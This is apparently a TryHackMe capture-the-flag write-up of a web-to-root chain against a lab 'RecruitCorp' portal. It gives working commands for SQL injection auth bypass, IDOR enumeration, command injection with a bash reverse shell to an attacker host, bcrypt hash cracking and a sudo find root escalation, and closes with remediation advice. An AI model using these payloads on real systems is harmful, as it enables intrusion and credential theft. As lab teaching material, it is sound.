# Operation Promotion — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy/Medium (web → root chain)
**Target:** RecruitCorp — Careers Portal
**Scope:** Single Linux host (AWS/EC2), authorized lab environment

> **Scenario:** A solo engagement against *RecruitCorp*, a small recruiting firm with a public-facing portal. Goal: compromise the host, capture both flags, and demonstrate readiness for a penetration-testing role.

---

## TL;DR — Kill Chain

| # | Stage | Technique |
|---|-------|-----------|
| 1 | Recon | `nmap`, `gobuster`, SMB enumeration |
| 2 | Initial access | SQL injection auth-bypass on a custom PHP login form |
| 3 | Enumeration | IDOR on `lookup.php?id=` → user list + service-account hint |
| 4 | RCE | Command injection in `ping.php` → `www-data` shell |
| 5 | Loot | bcrypt hash for `jford` in `db.conf` |
| 6 | Cracking | OSINT wordlist built from the homepage → user flag |
| 7 | Privesc | `sudo NOPASSWD: /usr/bin/find` (GTFOBins) → root |

---

## 1. Reconnaissance

### 1.1 Port scan

```bash
nmap -sC -sV -p- -O <TARGET_IP>
```

Key results:

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 9.6p1 (Ubuntu) | Post-exploitation target |
| 80/tcp | Apache 2.4.58 | "RecruitCorp - Careers Portal"; `robots.txt` discloses `/admin/` |
| 139/445 | Samba smbd 4.6.2 | NetBIOS name `RECRUITCORP` |

OS detection returned no exact match (EC2 stack quirk), but the SSH banner and `cpe:/o:linux:linux_kernel` confirm **Ubuntu Linux**. The reported `Windows 7 / Server 2008 R2` from later RPC enumeration is a Samba `srvinfo` artifact and was disregarded.

### 1.2 Web content discovery

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
gobuster dir -u http://<TARGET_IP>/admin/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Findings:

- `/admin/index.php` — login form (`username`, `password`, POST → `/admin/`).
- `/admin/dashboard.php` — 302 → `/admin/` (gated behind authentication).
- `/admin/users/` — **directory listing enabled (autoindex)** → exposed `lookup.php`.

### 1.3 SMB enumeration

```bash
smbclient -L //<TARGET_IP>/ -N
enum4linux-ng -A <TARGET_IP>
smbclient //<TARGET_IP>/public -N
```

- Null session allowed; share `public` was anonymously readable (`Listing: OK`).
- Content: a single `README.txt` — *"This share is reserved for future internal file distribution. Nothing to see here yet."*
- **Conclusion: rabbit hole.** Logged and moved on.

> **Lesson:** Recognizing a decoy early saves time. An anonymously readable share that contains only a "nothing here" note is a designed distraction.

---

## 2. Initial Access — SQL Injection Auth-Bypass

### 2.1 Behavioral detection

A failed login returns `Invalid credentials.` — a reliable failure marker. Probing the username field with a single quote:

```bash
curl -s "http://<TARGET_IP>/admin/" \
  --data-urlencode "username=admin'" --data-urlencode "password=x"
# → Invalid credentials.   (syntax broke)
```

The single quote alters behavior — indicative of unsanitized input. Confirming with a comment payload:

```bash
curl -si "http://<TARGET_IP>/admin/" \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode "password=x"
# → Set-Cookie: PHPSESSID=...
# → Location: /admin/dashboard.php     <-- SUCCESS
```

Success markers: **no** `Invalid credentials`, **302 redirect to dashboard**, **fresh session cookie**.

### 2.2 Root cause (confirmed later in source)

`/var/www/html/admin/index.php`:

```php
// VULN: direct string concatenation - SQL injection
$query = "SELECT id, username FROM users WHERE username='$u' AND password='$p'";
```

Payload `admin'-- -` comments out the password check:

```sql
SELECT id, username FROM users WHERE username='admin'-- -' AND password='x'
```

> **Note on tooling:** `sqlmap --batch` reported *"not injectable"* — it auto-declined to follow the 302 it had itself triggered. **Trust observed behavior (302 + cookie) over a tool's verdict.** sqlmap hunts data-extraction injections, not auth bypasses.

### 2.3 Persisting the session

```bash
curl -s -c cookies.txt "http://<TARGET_IP>/admin/" \
  --data-urlencode "username=admin'-- -" --data-urlencode "password=x" -o /dev/null
curl -s -b cookies.txt "http://<TARGET_IP>/admin/dashboard.php"
```

The dashboard reveals the real lookup parameter:

```html
<form method="GET" action="/admin/users/lookup.php">
  <input name="id" type="number" min="1" required>
<a href="/admin/users/lookup.php?id=1">View own profile</a>
```

> **Lesson:** Post-auth interfaces name their own parameters — read forms/links instead of brute-guessing.

---

## 3. Enumeration — IDOR on `lookup.php`

### 3.1 Testing the `id` parameter for SQLi (negative)

```bash
curl -s -b cookies.txt "http://<TARGET_IP>/admin/users/lookup.php?id=1'"
# → identical admin profile (param cast to int)
```

Source confirms it is **not** injectable — `intval()` + prepared statement:

```php
$id = intval($_GET['id'] ?? 0);
$stmt = $db->prepare("SELECT id, username, role, notes FROM users WHERE id=:id");
$stmt->bindValue(':id', $id, SQLITE3_INTEGER);
```

> **Lesson:** `id=1'` returning normal data = integer cast = likely *not* injectable. A blank curl response to `id=1 AND 1=1` earlier was an **un-encoded-space artifact**, not a result — always URL-encode (`-G --data-urlencode`).

### 3.2 IDOR — enumerating users by ID

The parameter is useless for SQLi but valuable as an **IDOR**:

```bash
for i in $(seq 1 20); do
  echo "=== id=$i ==="
  curl -s -b cookies.txt "http://<TARGET_IP>/admin/users/lookup.php?id=$i" \
    | grep -A1 -iE "Username|Role|Notes"
done
```

| ID | Username | Role | Notes |
|----|----------|------|-------|
| 1 | admin | admin | Primary admin account |
| 2 | mvasquez | recruiter | Owns the EMEA pipeline |
| 3 | tparker | recruiter | Owns the AMER pipeline |
| 4 | lhayes | analyst | Reporting only |
| 5 | kchen | recruiter | Out on leave |
| 6 | rdavis | analyst | Reporting only |
| 7 | **sysmaint** | **system** | **Service account for `/admin/sysmaint-checks/ping.php`. Do not disable.** |
| 8 | jbailey | recruiter | New starter Q3 |
| 9 | aokafor | recruiter | APAC |

> **Lesson:** A service account with an atypical role + a path in its Notes is a deliberate breadcrumb to a hidden endpoint (`ping.php`) that wasn't in `robots.txt` or gobuster.

---

## 4. Remote Code Execution — Command Injection

### 4.1 Identifying the sink

```bash
curl -s -b cookies.txt "http://<TARGET_IP>/admin/sysmaint-checks/ping.php"
# → Usage: /admin/sysmaint-checks/ping.php?host=<target>

curl -s -b cookies.txt "http://<TARGET_IP>/admin/sysmaint-checks/ping.php?host=127.0.0.1"
# → PING 127.0.0.1 ... (real ping output → command execution likely)
```

### 4.2 Confirming injection

```bash
curl -s -b cookies.txt -G "http://<TARGET_IP>/admin/sysmaint-checks/ping.php" \
  --data-urlencode "host=127.0.0.1; whoami"
# → ...ping output...
# → www-data        <-- RCE CONFIRMED
```

The `;` separator chains a second command. Source comment confirms the bug:

```php
// VULN: unsanitised input passed directly to shell
```

### 4.3 Reverse shell + TTY upgrade

```bash
# attacker
nc -lvnp 4444

# via injection
curl -s -b cookies.txt -G "http://<TARGET_IP>/admin/sysmaint-checks/ping.php" \
  --data-urlencode "host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

```bash
# stabilize
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → on attacker: stty raw -echo; fg → Enter Enter
```

---

## 5. Loot & Credential Cracking

### 5.1 Internal recon

```bash
cat /etc/passwd | grep -v nologin | grep -v false
# root, ubuntu (uid 1000), jford (uid 1001)

ls -la /home
# jford  drwxr-x---  <-- locked (target user flag lives here)
# ubuntu drwxr-xr-x  <-- ubuntu has sudo (.sudo_as_admin_successful marker)
```

`grep` across the webroot surfaced credentials:

```bash
grep -riE "password|pass|secret|jford|db|sqlite" /var/www/html/ 2>/dev/null
```

`/var/www/html/config/db.conf`:

```
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKr??????????????????????????????
db_engine=sqlite3
```

> Hash partially redacted. Prefix `$2b$` = **bcrypt**, cost `10`.

### 5.2 OSINT wordlist from the homepage

bcrypt is deliberately slow, so a broad `rockyou` run was avoided. Instead, a themed wordlist was built from the careers-page copy (CeWL-style) and mutated with hashcat rules:

```bash
echo "spring2026" > base2.txt
hashcat --stdout base2.txt -r /usr/local/hashcat/rules/dive.rule > wordlist2.txt
```

### 5.3 Cracking the hash (offline — the correct path)

```bash
echo '$2b$10$QzkXmGndA2cQLozO3xAN6eWKr??????????????????????????????' > hash.txt
hashcat -m 3200 hash.txt wordlist2.txt
# Cracked in ~6s @ ~20 H/s (CPU):
# $2b$10$Qzk...:spring2??????
```

Recovered password: `spring2???` *(half-masked — derived from "Spring 2026 Hiring Drive" on the homepage + a symbol)*.

> **Key lesson — offline beats online when you hold the hash:**
> | Method | Speed | rockyou (14M) | Noise |
> |--------|-------|---------------|-------|
> | hydra over SSH | ~2 H/s | ~8 days | loud, log spam |
> | hashcat bcrypt (CPU) | ~20 H/s | ~hours | silent, no packets |
> | hashcat bcrypt (GPU) | 80k–200k H/s | ~minutes | silent |
>
> Reserve `hydra` for when **no hash** is available. A narrow themed wordlist beats `rockyou` against slow hashes.

### 5.4 User access + flag

```bash
ssh jford@<TARGET_IP>          # password: spring2???
cat ~/user.txt
# THM{bdbee0a91ebcb0b0fafde9312??????????}
```

---

## 6. Privilege Escalation — sudo find (GTFOBins)

### 6.1 The vector

```bash
sudo -l
# User jford may run the following commands on recruitcorp:
#     (root) NOPASSWD: /usr/bin/find
```

`find` supports `-exec`, which runs arbitrary commands. Running it as root yields a root shell:

```bash
sudo find . -exec /bin/bash -p \; -quit
id
# uid=0(root) gid=0(root) groups=0(root)
```

- `-exec /bin/bash -p \;` — spawn a shell for each match
- `-p` — preserve privileges (do not drop euid)
- `-quit` — stop after the first spawn

> **Reference:** https://gtfobins.github.io/gtfobins/find/ — any `sudo NOPASSWD` binary that can execute/read/write leads to root. Check GTFOBins first whenever `sudo -l` lists a binary.

Other checks (SUID, capabilities, cron) were clean — only standard system binaries and `cap_net_raw` on `ping`. `sudo -l` was the decisive vector and could have ended the search on the first line.

### 6.2 Root flag

```bash
cat /root/flag.txt
# THM{d999a1f6319a9c5b48c067df??????????}
```

---

## 7. Summary

| Flag | Value (half-masked) |
|------|---------------------|
| User | `THM{bdbee0a91ebcb0b0fafde9312??????????}` |
| Root | `THM{d999a1f6319a9c5b48c067df??????????}` |

A full web-to-root chain: a single-statement SQL injection opened the door, an IDOR mapped the users and pointed at a hidden maintenance endpoint, command injection delivered code execution, a config-file bcrypt hash plus an OSINT wordlist provided lateral movement, and a `sudo find` misconfiguration finished the job.

### Vulnerabilities

1. **SQL injection** (auth bypass) — string concatenation in the admin login query.
2. **IDOR** — no authorization check binding `lookup.php?id` to the session user.
3. **Information disclosure** — directory autoindex on `/admin/users/`; sensitive Notes; bcrypt hash in a world-readable config.
4. **OS command injection** — unsanitized `host` parameter in `ping.php`.
5. **Credential weakness** — guessable, theme-derived password.
6. **Sudo misconfiguration** — `NOPASSWD: /usr/bin/find` grants full root.

### Remediation

- Use parameterized queries everywhere (the `lookup.php` prepared statement is the correct pattern — apply it to the login query too).
- Enforce object-level authorization on `lookup.php`.
- Disable Apache autoindex; move config/DB outside the webroot; tighten file permissions.
- Never pass user input to a shell — use a native ICMP library or strict allow-list validation.
- Enforce a strong password policy; avoid company-derived passwords.
- Remove `sudo NOPASSWD: find`; scope sudo to specific, non-shell-spawning commands.

### Methodology notes (for future engagements)

- Trust **observed behavior** over a tool's verdict (sqlmap false-negative on the auth bypass).
- Distinguish **signal from artifact**: multi-thread timing noise, un-encoded URL spaces, blanket `.phps` 403s.
- With a hash in hand, **crack offline**; keep online brute-force as a last resort.
- Read **file permissions as a map** — a locked home dir means "become that user."
- **GTFOBins reflex** on any `sudo -l` entry.

---

*Authorized lab environment only. Flags and credentials partially redacted.*
